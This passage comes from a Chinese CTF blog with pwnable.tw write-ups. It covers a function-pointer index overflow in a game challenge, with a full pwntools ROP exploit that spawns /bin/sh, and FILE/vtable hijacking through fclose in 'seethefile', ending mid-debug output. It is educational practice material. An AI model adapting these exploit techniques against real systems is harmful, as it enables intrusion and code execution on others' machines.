    <span class="n">alarm</span><span class="p">(</span><span class="mh">0x3Cu</span><span class="p">);</span>
    <span class="n">menu_func_ptr</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">readn</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">256u</span><span class="p">)</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">func_ptrs</span><span class="p">[</span><span class="n">v3</span><span class="p">])();</span>          <span class="c1">// 数组index溢出！</span>
  <span class="p">}</span>
  <span class="n">do_bye</span><span class="p">();</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在 main 函数中，有一个对于函数指针数组的调用，index 数据来自于用户输入经 strtol 转化成的数字。我们可以用 <code class="language-plaintext highlighter-rouge">cmd_set_name</code> 函数修改 data 段的数据，再让程序 call 我们控制的地址，达成 arbitary call。</p>

<h3 id="利用">利用</h3>

<h3 id="rop-方法">ROP 方法</h3>

<p>有了任意调用，程序又没有开 PIE，接下来就是看看程序本体有哪些东西可以给我们来调用。
我在本体中，并没有找到 win 相关的函数，也没有找到导入的 system 符号，因此似乎没有简单的 ret2text 方法来完成一击必杀。</p>

<p>那就来打个 ROP 吧，我们可以直接用 main 函数 buffer 来存放 ROP 链，只要找一个类似于 <code class="language-plaintext highlighter-rouge">add esp, xxx; ret;</code> 的 gadget 即可。</p>

<p>使用这种方法，我们可以先用 <code class="language-plaintext highlighter-rouge">puts</code> 泄露 libc 基址，然后就能 <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> 了。具体利用见完整 EXP。
查 libc 版本用的是 <a href="https://libc.rip/">libc-database</a>，俄罗斯那个（<a href="https://libc.blukat.me/">libc.blukat.me</a>）查到的结果贼少，不知道为什么。</p>

<h3 id="路径穿越方法存在利用条件限制">路径穿越方法（存在利用条件限制）</h3>

<p>ROP 方法是我不小心从网上看到的，唉我不应该上网查的。
不过我自己也想出了一个非常绝妙的利用，不需要用到 ROP！</p>

<p>我们已有的任意调用，其参数是固定好的，第一个参数是一个我们可控的字符串指针，第二个参数是 0。顺着这个思路，我们可以先看看程序本体中有哪些函数，其第一个参数是 <code class="language-plaintext highlighter-rouge">char*</code> 类型的。</p>

<p>首先，此类函数肯定是 printf 最常见也最好利用，我们可以用这种方法将任意调用宽展成任意读写，但程序开启了 FORTIFY 保护，里面甚至只有 <code class="language-plaintext highlighter-rouge">_printf_chk</code> 函数没有 <code class="language-plaintext highlighter-rouge">printf</code> 函数。两者的区别在于，后者其实是前者的一个 wrapper。
前者的第一个参数是一个安全等级，1 表示开启，0 表示关闭。当开启时，格式化字符串攻击将会被大大削弱，比如不能直接使用 <code class="language-plaintext highlighter-rouge">%n$d</code> 了，如果要用到这玩意，必须前面要有 <code class="language-plaintext highlighter-rouge">%1$d</code> <code class="language-plaintext highlighter-rouge">%2$d</code> … <code class="language-plaintext highlighter-rouge">%(n-1)$d</code> 这些。
因此，这条路走不通。</p>

<p>但我们就可以找到另外两个首个参数的—— <code class="language-plaintext highlighter-rouge">mkdir</code> 和 <code class="language-plaintext highlighter-rouge">open</code>。既然有 open，就可以想想是不是能 orw 把 flag 读出来。但是，程序的漏洞处，相邻的两次触发之间隔了许多个函数调用，这就不允许我们把 open 返回值暂时放在寄存器中，这里就很难进行下一步操作。</p>

<p>但是，我把整个 binary 都审了一边，发现了一个有趣的机制：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">cmd_multiplayer_enable</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">__pid_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="n">socklen_t</span> <span class="n">len</span><span class="p">;</span> <span class="c1">// [esp+2Ch] [ebp-80h] BYREF</span>
  <span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">addr</span><span class="p">;</span> <span class="c1">// [esp+32h] [ebp-7Ah] BYREF</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">fd</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="n">addr</span><span class="p">.</span><span class="n">sa_family</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>                         <span class="c1">// UDP</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">fd</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="p">...</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"[Error] Fail to enable"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>在 <code class="language-plaintext highlighter-rouge">cmd_multiplayer_enable</code> 中，有对于一个全局变量 <code class="language-plaintext highlighter-rouge">fd</code> 的赋值。而我们知道，进程打开的第一个文件往往是接在 <code class="language-plaintext highlighter-rouge">stderr</code> 的后面，也就是 fd == 3。
我们可以观察到，程序在使用 close 关闭 fd 之后，并没有清空 fd 的值，也就是这里依然是 3。实际调用这个函数，发现程序肯定可以走到关闭 fd 的代码。</p>

<p>我们查找 fd 的应用，可以找到这里：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">cmd_multiplayer_recvmap</span><span class="p">()</span>
<span class="p">{</span>
  <span class="p">...</span>
  
  <span class="n">v5</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Ask your friends to share their coordinates!"</span><span class="p">);</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"[Error] Transmission error :("</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">rotate_shift_add_decrypt</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"[Info] Receiving ("</span><span class="p">);</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">putchar</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="p">}</span>
  
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这里程序将会尝试从 fd 中读取内容，每一个字节都使用 <code class="language-plaintext highlighter-rouge">rotate_shift_add_decrypt</code> 函数进行加密，然后打印出结果。</p>

<p>于是我们可以想到一条利用链：</p>

<ol>
  <li>调用 <code class="language-plaintext highlighter-rouge">cmd_multiplayer_enable</code>，让 fd 被置为 3；</li>
  <li>调用 <code class="language-plaintext highlighter-rouge">open</code> 函数打开 flag；</li>
  <li>调用 <code class="language-plaintext highlighter-rouge">rotate_shift_add_decrypt</code>，读取加密后的 flag 并输出；</li>
  <li>本地尝试暴力破解！</li>
</ol>

<p>但我们会遇到一个问题：虽然我们可以控制第一个参数这个字符串，但是其开头被限制了是一个数字，因为我们就是用这个数字当作数组下标来实现任意调用的。
为此，我想到了一种借用 <code class="language-plaintext highlighter-rouge">mkdir</code> 来加强 <code class="language-plaintext highlighter-rouge">open</code> 的方法：</p>

<ol>
  <li>调用 <code class="language-plaintext highlighter-rouge">mkdir("-33\0")</code> 在当前目录创建名为 -33 的文件夹；</li>
  <li>调用 <code class="language-plaintext highlighter-rouge">open("-33/../flag\0")</code> 打开任意目录下的 flag。</li>
</ol>

<p>在本地，这种方法是可行的。然而，远程环境中执行 binary 的路径是根目录，而进程并没有在根目录创建文件夹的权限，因此这种方法很遗憾地失效了 : (</p>

<h2 id="完整exp">完整EXP</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>

<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">filename</span><span class="p">])</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"chall.pwnable.tw"</span><span class="p">,</span> <span class="mi">10202</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="n">g</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s">"""
        b *0x0804A65D
    """</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="c1"># 0x08048e48 : add esp, 0x1c ; ret
</span>    <span class="n">add_esp_1c_ret</span> <span class="o">=</span> <span class="mh">0x08048e48</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
        <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_start'</span><span class="p">],</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
    <span class="p">])</span>

    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"6"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">add_esp_1c_ret</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"-33</span><span class="se">\0</span><span class="s">dead"</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">mes</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\xf7</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span>

    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">mes</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x5fca0</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x3ada0</span>
    <span class="c1"># system_addr = libc_base + 0x49670 # printf
</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
        <span class="n">system_addr</span><span class="p">,</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_start'</span><span class="p">],</span> <span class="mh">0x080580D0</span><span class="o">+</span><span class="mh">0x4</span><span class="p">,</span>
    <span class="p">])</span>

    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"6"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">add_esp_1c_ret</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"-33</span><span class="se">\0</span><span class="s">dead"</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">pwn</span><span class="p">()</span>

</code></pre></div></div>

<h2 id="反思和总结">反思和总结</h2>

<p><strong>函数数组和数组下标都是非常危险的东西——前者容易被劫持，后者容易超越边界。</strong>
本漏洞修补十分简单，只需要加上一个检查就可以了。</p>

<p>从这道题目的利用中，我们可以发现：<strong>任意调用与 gadget 结合或许可以轻松达成栈迁移，允许我们进行 ROP 攻击。</strong></p>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[本题 neta 了星界边境，实现了一个简单的二维探索游戏。]]></summary></entry><entry><title type="html">pwnable.tw seethefile</title><link href="https://www.cameudis.com/2023/05/07/pwnable-tw-seethefile-writeup.html" rel="alternate" type="text/html" title="pwnable.tw seethefile" /><published>2023-05-07T20:44:10+08:00</published><updated>2023-05-07T20:44:10+08:00</updated><id>https://www.cameudis.com/2023/05/07/pwnable-tw-seethefile-writeup</id><content type="html" xml:base="https://www.cameudis.com/2023/05/07/pwnable-tw-seethefile-writeup.html"><![CDATA[<p>借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>

<p>本题相关：FILE伪造、vtable伪造、fclose</p>

<hr />

<h2 id="漏洞分析">漏洞分析</h2>

<p>保护情况：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre></div></div>

<p>程序大致是一个menu，可以选择以下几种功能：</p>
<ol>
  <li>open：指定文件名打开文件，将FILE*保存到bss段的fp（不允许文件名中含有flag子字符串）</li>
  <li>read：从fp中读取0x18F个字节，并保存到bss段的magic_buffer中</li>
  <li>write：将magic_buffer中的内容打印到屏幕上（不允许内容中含有flag、}）</li>
  <li>close：关闭fp</li>
  <li>exit：往bss读取一串字符串（name）后，尝试fclose(fp)并退出</li>
</ol>

<p>程序漏洞点有两个：</p>
<ol>
  <li>main函数读取选项时，使用了 <code class="language-plaintext highlighter-rouge">scanf("%s", buf)</code>，其中buf是一个栈变量。</li>
  <li>main函数在exit读取name时，也使用了 <code class="language-plaintext highlighter-rouge">scanf("%s", name)</code>，其中name在bss段上，且fp在它的后面。</li>
</ol>

<p>由于main函数没有ret，只有exit，因此我们没办法使用第一个漏洞来劫持程序控制流。
但第二个漏洞非常有用，我们可以通过溢出name来覆写fp指针，通过伪造FILE结构体和vtable的方式，我们可以让fclose调用某个给定的地址的代码，从而劫持程序控制流。</p>

<p>此外，还有一个不太算漏洞的疏忽，就是我们可以通过读取 <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> 来得到程序各个段的地址。虽然read一次只能读取0x18F个字节，但是由于文件流在下一次读取时会接着读，所以我们是可以获取完整的文件内容的。</p>

<h2 id="file-结构体分析">FILE 结构体分析</h2>

<p>在glibc中，有三个初始文件流直接位于glibc的数据段，是stdin、stdout和stderr。当用户使用fopen打开新的文件时，FILE结构体会使用malloc分配到程序的堆上。</p>

<p>FILE结构体的定义位于 <code class="language-plaintext highlighter-rouge">libio/libio.h</code>，在2.23-0ubuntu3版本中如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="cp">#define _IO_file_flags _flags
</span>
  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
<span class="c">#if 0
  int _blksize;
#else</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp">
</span>  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>
</code></pre></div></div>

<p>不过完整的FILE结构还多一个word，用来存放一个函数指针表vtable，这是为了与C++的streambuf兼容，在 <code class="language-plaintext highlighter-rouge">libio/libioP.h</code> 中可以找到其定义：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */</span>

<span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="c">#if 0
    get_column;
    set_column;
#endif
</span><span class="p">};</span>
</code></pre></div></div>

<h2 id="fclose-分析">fclose 分析</h2>

<p>声明在 <code class="language-plaintext highlighter-rouge">include/stdio.h</code> 中：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="kt">int</span> <span class="nf">_IO_new_fclose</span> <span class="p">(</span><span class="n">_IO_FILE</span><span class="o">*</span><span class="p">);</span>
<span class="cp">#   define fclose(fp) _IO_new_fclose (fp)
</span></code></pre></div></div>

<p>定义在 <code class="language-plaintext highlighter-rouge">libio/iofclose.c</code> 中，比较重要的是下面几行：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* First unlink the stream.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
    <span class="n">_IO_un_link</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>

  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
    <span class="n">status</span> <span class="o">=</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">status</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_ERR_SEEN</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="n">_IO_FINISH</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</code></pre></div></div>

<p>与lock相关的代码实在是太复杂了，现在的我还没有宏孩儿的功力，因此只能暂且作罢。事实证明这题里面不用管它。</p>

<p>那么有两种攻击方法：一种是通过_IO_file_close_it调用vtable中的 <code class="language-plaintext highlighter-rouge">__close</code>；一种是通过_IO_FINISH（定义见下）调用vtable中的 <code class="language-plaintext highlighter-rouge">__finish</code>。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
</span></code></pre></div></div>

<p>我使用的是后者，因为比较简单，但第一个方法看上去也是非常可行的。
具体来说，只要把 <code class="language-plaintext highlighter-rouge">_IO_IS_FILEBUF</code> flag置零，就可以跳过unlink和close_it，调用到finish。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>既然栈上可以随便溢出，那我就寻思着想办法来个ROP！
我们可以使用上述方法劫持程序控制流来执行一次给定地址的代码，因此我的思路就是找一个长得像这样的gadget，直接将栈“迁移”到我可以控制的位置：<code class="language-plaintext highlighter-rouge">add esp, xxx; ret</code></p>

<p>在本地调试时，在调用 <code class="language-plaintext highlighter-rouge">__finish</code> 后的第一条指令处停下，然后查看此时栈的情况：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; stack 30
00:0000│ esp 0xffffcafc —▸ 0xf7e79fa8 (fclose+232) ◂— mov edx, dword ptr [esi + 0x68]
01:0004│     0xffffcb00 —▸ 0x804c410 ◂— 0xfbad240c
02:0008│     0xffffcb04 ◂— 0x0
03:000c│     0xffffcb08 —▸ 0xf7e5ebcb (vfprintf+11) ◂— add ebx, 0x16e435
04:0010│     0xffffcb0c ◂— 0x0
